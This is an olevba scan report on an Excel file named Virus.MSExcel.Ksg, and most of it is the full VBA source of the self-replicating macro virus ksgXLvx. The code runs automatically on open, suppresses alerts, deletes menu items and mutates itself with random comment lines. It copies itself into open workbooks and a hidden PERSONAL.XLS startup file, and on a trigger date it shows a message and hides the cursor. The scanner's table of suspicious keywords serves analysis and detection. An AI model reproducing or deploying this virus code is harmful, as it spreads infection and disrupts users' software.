olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Ksg
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: ./Virus.MSExcel.Ksg - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: ./Virus.MSExcel.Ksg - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: ./Virus.MSExcel.Ksg - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: ./Virus.MSExcel.Ksg - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ksgXLvx.bas 
in file: ./Virus.MSExcel.Ksg - OLE stream: '_VBA_PROJECT_CUR/VBA/ksgXLvx'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
; This is ksgXLvx
; (c) 2000 by ksg
; astigmatiZm virus group
; www.astigmatizm.cjb.net
; Import in XL VB to activate this virus


Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer
Sub Auto_Open()
Application.OnSheetActivate = "osa"
End Sub

Sub osa()
On Error Resume Next
vname = "ksgXLvx"
dfname = "PERSONAL.XLS"
asp = Application.StartupPath & "\" & dfname
loop1 = 0
loop2 = 0
With Application
.StatusBar = "XM97.ksgXLvx"
.ScreenUpdating = (Rnd * 0)
.DisplayAlerts = (Rnd * 0)
.EnableCancelKey = xlDisabled
End With
CommandBars("Tools").Controls(10).Delete
CommandBars("Tools").Controls(12).Delete
CommandBars("View").Controls(3).Delete
CommandBars("Window").Controls(3).Delete
CommandBars("Window").Controls(4).Delete
Set var1 = Current.VBProject.VBComponents
Set var2 = CodeModule
Set Current = MacroContainer
For loops = 1 To 20
Number = var1("ksgXLvx").var2.ProcCountLines("osa", vbext_pk_Proc)
RandomLine = Int(Rnd() * Number + 1)
RemarkLength = Int(Rnd() * 40 + 1)
For Length = 1 To RemarkLength
Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next Length
var1("ksgXLvx").var2.InsertLines RandomLine, vbTab & "Rem " & Remark
Remark = ""
Next loops
Call ksg
End Sub

Sub ksg()
On Error Resume Next
If Day(Now()) = 10 And Month(Now()) = 9 Then
MsgBox "yet another virus from ksg....", vbCritical, "ksgXLvx"
ActiveDocument.Content.Font.Animation = wdAnimationSparkleText
While ShowCursor(False) >= 0
Wend
End If
Application.VBE.ActiveVBProject.VBComponents.Item(vname).Export "C:\ksgXLvx.sys"
If Dir(asp) = dfname Then loop2 = 1
For x = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(x).Name = vname Then loop1 = 1
Next x
If loop1 = 0 Then
ActiveWorkbook.VBProject.VBComponents.Import "C:\ksgXLvx.sys"
ActiveWorkbook.Save
End If
If loop2 = 0 Then
Workbooks.Add.SaveAs FileName:=asp
ActiveWorkbook.VBProject.VBComponents.Import "C:\ksgXLvx.sys"
ActiveWindow.Visible = False
Workbooks(dfname).Save
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

